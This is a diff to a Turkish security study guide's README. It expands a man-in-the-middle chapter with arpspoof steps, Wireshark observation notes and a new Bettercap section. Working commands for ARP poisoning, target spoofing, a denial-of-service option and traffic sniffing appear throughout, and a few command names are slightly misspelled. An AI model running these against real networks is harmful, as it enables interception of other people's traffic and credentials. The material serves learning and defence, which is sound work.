@@ -22,6 +22,8 @@
   - [nmap](#nmap)
 - [7-Man in the Middle Saldırısı](#7-Man-in-the-Middle-Saldırısı)
   - [Arpspoof](#Arpspoof)
+  - [Bettercap](#Bettercap)
+    - [Bettercap ile Dinleme Yapma](#Bettercap-ile-Dinleme-Yapma)
   - [Wireshark ile MITM Saldırısı İzleme](#Wireshark-ile-MITM-Saldırısı-İzleme)
   - [Windows Bilgisayarımıza MITM Saldırısı Var Mı](#Windows-Bilgisayarımıza-MITM-Saldırısı-Var-Mı)
 
@@ -193,25 +195,46 @@ karşı taraf görebilir
 İlk olarak **arpspoof**'u indirmemiz gerekiyor onun için; ```apt install dsniff```
 
 ```arpspoof -i eth0 -t XX:XX:XX:XX YY:YY:YY:YY```  target'a kendimizi modem olarak tanıtıyoruz
-
+```
 -t: Kurban IP
 
 YY:YY:YY:YY : Kendi IP adresimiz 
-
+```
 Daha sonra ```arpspoof -i eth0 -t YY:YY:YY:YY XX:XX:XX:XX``` yazarak modem'e kendimizi target olarak tanıtıyoruz
-
+```
 -t: Kendi IP'miz
 XX:XX:XX:XX : Kurban IP
-
+```
 ``` echo 1 > /proc/sys/net/ipv4/ip-forward``` IP forwardlamayı etkinleştirerek **hedef pc'nin** ağdan kopmamasını sağlıyoruz
 
 > ### Wireshark ile MITM Saldırısı İzleme
 
-* Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebilir eğer işlemlerin yanında **duplicate use of..** yazıyorsa MITM saldırısı vardır
-* **http** olan websitesi içine girilen bilgiler (e.g. Login bilgileri) Wireshark içinden incelenerek görülebilir
-* **https** olan websitelerinde bu bilgiler şifreli olarak taşındığı için açık şekilde okunamaz
+Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebilir eğer işlemlerin yanında **duplicate use of..** yazıyorsa MITM saldırısı vardır. **http** olan websitesi içine girilen bilgiler (e.g. Login bilgileri) Wireshark içinden incelenerek görülebilir. **https** olan websitelerinde bu bilgiler şifreli olarak taşındığı için açık şekilde okunamaz
 
   ![wireshark görsel](https://github.com/ahmetnuysal/Cyber-Security/blob/6880076de41a97a03edb4fe36e75dfce1e58ac9a/MITM/WhatsApp%20Image%202022-08-16%20at%2019.17.24.jpeg)
+
+> ### Bettercap 
+
+* Terminal'e ```bettercap -iface eth0``` yazarak bettercap'i açıyoruz
+* bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz
+```
+* ```net.prope on``` Ağdaki cihazların IP adresini, MAC adreslerini ve cihaz isimlerini gösterir
+* ```net.show``` Toplanan bilgileri özet olarak gösterir
+```
+```
+### Bettercap İçinde
+* ```arp.ban on``` hedef PC'ye deauth saldırısı yapar
+* ```arp.spoof.fullduplex``` Hem modeme hem PC'ye MITM saldırısı yapar
+* ```arp.spoof.internal``` True olursa, PC'ler arasındaki bağlantıları gösterir
+* ```arp.spoof.skip_restore``` True olursa, Saldırı sonrası doğru verileri göndermez
+* ```arp.spoof.targets 192.168.123.123``` "," koyarak birden fazla PC'ye MITM saldırısı yapabiliriz
+* ```arp.spoof.whitelist``` Belirtilen IP adreslerine sahip cihazlara saldırı yapmaz
+```
+Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. arp.spoof.fullduplex true)``` 
+
+> ### Bettercap ile Dinleme Yapma
+
+* ```net.sniff on``` Hedef PC'yi dinlemeye başlar
 
 
 > ### Windows Bilgisayarımıza MITM Saldırısı Var Mı 
